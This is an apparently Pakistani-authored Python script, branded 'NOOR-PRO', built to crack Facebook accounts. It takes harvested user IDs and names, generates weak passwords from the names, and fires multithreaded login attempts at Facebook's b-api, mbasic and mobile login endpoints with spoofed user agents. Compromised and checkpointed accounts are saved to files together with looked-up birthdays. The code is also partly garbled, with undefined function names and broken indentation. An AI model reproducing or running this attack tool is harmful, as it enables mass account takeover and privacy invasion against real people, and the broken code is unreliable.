import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time
def line_chack_dote():
	m = [".","..","...","....","....."]
	for b in range(2):
		for t in m:
				sys.stdout.write("\r[*] Creating TNL Internet File " + t)
	sys.stdout.flush()
	time.sleep(0.1)
 logo=("""
  .d8b.  db   dD d888888b d8b   db  d888b 
 d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
 88ooo88 88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
 88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
 YP   YP YP   YD Y888888P VP   V8P  Y888P   
----------------------------------------------
 Author    : Zahida Noor
 Github    : MasterMind513
 Facebook  : Noor
 Tool Name : NOOR-PRO
 Type type : Free
 Version   : 1.00
----------------------------------------------
 NOOR Pro version 1.00
 Allah Helps Those WHose Help Other...
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
def re():
	logo()
	print (' [*]=============================================')
	print(" [1] Start Cracking  ")
	print(" [2] Create Supper File [ Unlamented ]")
	print(" [3] Feedback")
	print(" [4] YouTube ")
	print (" [5] Login Other Token")
	print (" [0] Exit Programing")
	print (' [*]=============================================')
	key = input(" [*] input : ")
	print (' [*]=============================================')
	if key in [""]:
		print (" [!] please select correct option")
		exit()
	elif key in ["1", "01"]:
		time.sleep(0.5)
		__crack__().plerr()
	elif key in ["2", "02"]:
		time.sleep(0.5)
		os.system('python Dump.py')
	elif key in ["3", "03"]:
		time.sleep(0.5)
		dupcutter()
	elif key in ["4", "04"]:
		time.sleep(0.5)
		sep()
	elif key in ["5", "05"]:
		time.sleep(0.5)
		login()
	elif key in ["0", "00" , "6"]:
		time.sleep(0.5)
		print (" [•] Search : Zahida Noor")
	elif key in ["0", "00"]:
		exit("\n [✓] Thank you so much♥️\n")
	else:
		exit()

ok = []
cp = []
id = []
user = []
num = 0
loop = 0
ZAHIDA = requests.get
Prof_Imtiaz = open
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 
def login():
	os.system("rm -rf access_token.txt");logo()
	tok = input(' [*] Enter Your Token : ')
	try:
			u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
			u1 = json.loads(u)
			name = u1['name']
			ts = open('access_token.txt', 'w')
			ts.write(tok)
			ts.close()
			print("\n\n[*] Login Successful as " + name )
			time.sleep(1)
			readline___Public_Xml()
	except KeyError:
			print('\n\n[*] Token Expired ')
			time.sleep(1)
			login()

def banner():
	logo()
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		ZAHIDA_NOOR('\n\n\033[0m The Prosess Done...')
		ZAHIDA_NOOR('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
		#ZAHIDA_NOOR('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
		ZAHIDA_NOOR('\n\033[0mUps..Tidak Mendapatkan Hasil')
		exit()
class __crack__:
	def __init__(self):
		self.id = []
	def plerr(self):
		try:
			self.apk = input(" [*] File Name : ")
			print (' [*]=============================================')
			self.id = ZAHIDA(self.apk).read().splitlines()
			ZAHIDA_NOOR(' [*] Total ID : %s'%(len(self.id)))
			print (' [✓] Are You Went To Continue : Type Y')
		except:
			ZAHIDA_NOOR('\n [!] File Not Found In Storage')
			input('\n [*] Press Enter To Back');readline___Public_Xml();print("[M] Menual Password ");print('[D] Default Password ')
     
		_jokowi_kontol_ = input(" [*] Choose : ")
		if _jokowi_kontol_ in ('M', 'm'):
			print('[*] Function Added in new update ')
		
			ZAHIDA_NOOR('\nEnter Password 123456 or 123456789 For OLd Idz ')
			while True:
				pwek = input('\nEnter Password : ')
				#ZAHIDA_NOOR('Sandi > %s'%(pwek))
				if pwek == '':
					ZAHIDA_NOOR('\nJangan Kosong')
					time.sleep(1)
					exit()
				elif len(pwek)<=5:
					ZAHIDA_NOOR('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
				else:
					def _sempak_(bse=None):
						boy = input('\nPilih : ')
						if boy == '':
							ZAHIDA_NOOR('\nJangan Kosong')
							time.sleep(1);self._sempak_()
						elif boy == "1" or boy == "01":
							ZAHIDA_NOOR('\n[•] Result OK saved to OK.txt')
							ZAHIDA_NOOR('[•] Result CP saved to CP.txt')
							ZAHIDA_NOOR('\n\tCrack Processing...\n')
							ZAHIDA_NOOR('\n\tCrack Processing...\n\n');logo()
							with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
								for ikeh in self.id:
									try:
										kimochi = ikeh.split('|')[0]
										_ngentot_gratis_.submit(self.__api__, kimochi, bse)
									except: pass
									
							os.remove(self.apk)
							hasil(ok,cp)
						elif boy == "2" or boy == "02":
							ZAHIDA_NOOR('\n[•] Result OK saved to OK.txt')
							ZAHIDA_NOOR('[•] Result CP saved to CP.txt')
							ZAHIDA_NOOR('\n\tCrack Processing...\n\n');logo()
							with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
								for ikeh in self.id:
									try:
										kimochi = ikeh.split('|')[0]
										_ngentot_gratis_.submit(self.__mbasic__, kimochi, bse)
									except: pass
							os.remove(self.apk)
							hasil(ok,cp)
						elif boy == "3" or boy == "03":
							ZAHIDA_NOOR('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
							ZAHIDA_NOOR('[•] Result CP saved to CP.txt')
							ZAHIDA_NOOR('\n\tCrack Processing...\n\n')
							ZAHIDA_NOOR('\n\tCrack Processing...\n\n');logo()
							with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
								for ikeh in self.id:
									try:
										kimochi = ikeh.split('|')[0]
										_ngentot_gratis_.submit(self.__mfb,__, kimochi, bse)
									except: pass
									
							os.remove(self.apk)
							hasil(ok,cp)
						else:
							exit()
					ZAHIDA_NOOR('\n01.) Metode b-api ')
					ZAHIDA_NOOR('02.) Metode mbasic ')
					ZAHIDA_NOOR('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
		elif _jokowi_kontol_ in ('Y', 'y'):
			print (' [*]=============================================')
			ZAHIDA_NOOR('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			ZAHIDA_NOOR(' [1] NOOR Method 1 ')
			ZAHIDA_NOOR(' [2] NOOR Method 2  [ Pro ]')
			ZAHIDA_NOOR(' [3] NOOR Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
		return
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [NOOR] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				ua_xiaomi = ZAHIDA('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_IMtiaz("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				ZAHIDA_NOOR('\r\033[1;92m[Successful-NOOR] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s %s'%(user,pw,tahun(user))
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				continue
			elif "www.facebook.com" in p["error_msg"]:
				try:
					token = ZAHIDA('login.txt').read()
					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					ZAHIDA_NOOR('\r\033[1;91m[Checkpoint-NOOR] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					year  = ''
				except:
					pass
				ZAHIDA_NOOR('\r\033[1;91m[Checkpoint-NOOR] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
				continue
		loop += 1
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [NOOR] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				ua_xiaomi = ZAHIDA('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				ZAHIDA_NOOR('\r\033[1;32m[Successful-NOOR] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				continue
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					token = ZAHIDA('token.txt').read()
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].ZAHIDA_NOOR('\r\033[1;91m[Checkpoint-NOOR] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					year  = ''
				except:
					pass
				ZAHIDA_NOOR('\r\033[1;91m[Checkpoint-NOOR] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
				continue
		loop += 1
	def __mfb__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [NOOR] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				ua_xiaomi = ZAHIDA('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua_xiaomi,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				ZAHIDA_NOOR('\r\033[1;92m[Successful-NOOR] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				continue
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					token = ZAHIDA('token.txt').read()
					cp_ttl = Prof_Aking('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					ZAHIDA_NOOR('\r\033[1;91m[Checkpoint-NOOR] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					year  = ''
				except:
					pass
				ZAHIDA_NOOR('\r\033[1;91m[Checkpoint-NOOR] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
				continue
		loop += 1
	def __pler__(self):
		yan = input('\n[•] Choose : ')
		if yan == '':
			ZAHIDA_NOOR('\Choose Error ')
			exit()
		elif yan in ('1', '01'):
			ZAHIDA_NOOR('\n[•] Result OK saved to OK.txt')
			ZAHIDA_NOOR('[•] Result CP saved to CP.txt')
			ZAHIDA_NOOR('\n\tCrack Processing...\n')
			ZAHIDA_NOOR('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						else:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						_ngentot_gratis_.submit(self.__api__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('2', '02'):
			ZAHIDA_NOOR('\n[•] Result OK saved to OK.txt')
			ZAHIDA_NOOR('[•] Result CP saved to CP.txt')
			ZAHIDA_NOOR('\n\tCrack Processing...\n')
			ZAHIDA_NOOR('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('3', '03'):
			
			ZAHIDA_NOOR('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						else:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						_ngentot_gratis_.submit(self.__mfb__, uid, pwx)
					except:
							pass
			os.remove(self.apk)
			hasil(ok,cp)
		else:
			ZAHIDA_NOOR('\nSalah')
			time.sleep(1)
			self.__pler__()
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = ' '
		elif fx[:9] in ['100000000']       :tahunz = '  '
		elif fx[:8] in ['10000000']        :tahunz = ' '
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' '
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' '
		elif fx[:6] in ['100001']          :tahunz = ' '
		elif fx[:6] in ['100002','100003'] :tahunz = ' '
		elif fx[:6] in ['100004']          :tahunz = ' '
		elif fx[:6] in ['100005','100006'] :tahunz = ' '
		elif fx[:6] in ['100007','100008'] :tahunz = ' '
		elif fx[:6] in ['100009']          :tahunz = ' '
		elif fx[:5] in ['10001']           :tahunz = ' '
		elif fx[:5] in ['10002']           :tahunz = ' '
		elif fx[:5] in ['10003']           :tahunz = ' '
		elif fx[:5] in ['10004']           :tahunz = ' '
		elif fx[:5] in ['10005']           :tahunz = ' '
		elif fx[:5] in ['10006','10007','10008']:tahunz = ' '
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = ' '
	elif len(fx)==8:
		tahunz = ' '
	elif len(fx)==7:
		tahunz = ' '
	else:tahunz=''
	return tahunz
if __name__=='__main__':
	os.system("git pull")
	
	help()
	
noorak_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
noorak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
noorak_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
noorak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
noorak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
noorak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
noorak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
noorak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
banner="""\033[1;37m
 
 [*]=============================================
    Author   : ZAHIDA NOOR
    Facebook : https://facebook.com/
    Team     : Noor
    Connect  : 03142864407
 [*]=============================================
   \033[1;31m  Use (Flight) Airplane Mod For Speed Up \033[1;37m
 [*]============================================="""
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()
def logo():
	time.sleep(0.5)
	os.system("clear")
	print(banner)
	print("")
	time.sleep(0.5)

def convert(cok):
	__for=(
			'datr='+cok['datr']
		)+';'+(
			'c_user='+cok['c_user']
		)+';'+(
			'fr='+cok['fr']
		)+';'+(
			'xs='+cok['xs'] )
	return __for

def dupcutter():
	os.system("xdg-open https://wa.me/+923142864407")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
	os.system("xdg-open https://www.youtube.com/@noortech942")
	time.sleep(3)
	readline___Public_Xml()
    
if __name__=='__main__':
	readline___Public_Xml()
